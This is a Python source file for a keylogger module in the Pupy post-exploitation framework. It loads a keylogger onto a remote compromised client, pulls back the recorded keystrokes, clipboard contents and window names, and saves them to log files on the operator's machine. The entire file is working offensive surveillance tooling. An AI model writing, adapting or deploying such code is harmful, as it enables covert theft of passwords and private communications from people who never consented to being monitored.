# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
import os
import datetime
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="KeyloggerModule"

@config(cat="gather")
class KeyloggerModule(PupyModule):
    """ 
        A keylogger to monitor all keyboards interaction including the clipboard :-)
        The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
    """
    #max_clients=1
    daemon=True
    unique_instance=True
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def stop_daemon(self):
        self.success("keylogger stopped")
        
    def run(self, args):
        if args.action=="start":
            if self.client.is_windows():
                self.client.load_package("pupwinutils.keylogger")
                with redirected_stdio(self.client.conn): #to see the output exception in case of error
                    if not self.client.conn.modules["pupwinutils.keylogger"].keylogger_start():
                        self.error("the keylogger is already started")
                    else:
                        self.success("keylogger started !")
            # not tested on android
            else:
                self.client.load_package("keylogger")
                with redirected_stdio(self.client.conn): #to see the output exception in case of error
                    if not self.client.conn.modules["keylogger"].keylogger_start():
                        self.error("the keylogger is already started")
                    else:
                        self.success("keylogger started !")

        elif args.action=="dump":
            try:
                os.makedirs(os.path.join("data","keystrokes"))
            except Exception:
                pass
            
            if self.client.is_windows():
                data=self.client.conn.modules["pupwinutils.keylogger"].keylogger_dump()
            else:
                 data=self.client.conn.modules["keylogger"].keylogger_dump()

            if data is None:
                self.error("keylogger not started")
            elif not data:
                self.warning("no keystrokes recorded")
            else:
                filepath=os.path.join("data", "keystrokes","keys_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
                self.success("dumping recorded keystrokes in %s"%filepath)
                with open(filepath, 'w') as f:
                    f.write(data)
                self.log(data)

        elif args.action=="stop":
            if self.client.is_windows():
                stop = self.client.conn.modules["pupwinutils.keylogger"].keylogger_stop()
            else:
                stop = self.client.conn.modules["keylogger"].keylogger_stop()

            if stop:
                self.success("keylogger stopped")
            else:
                self.success("keylogger is not started")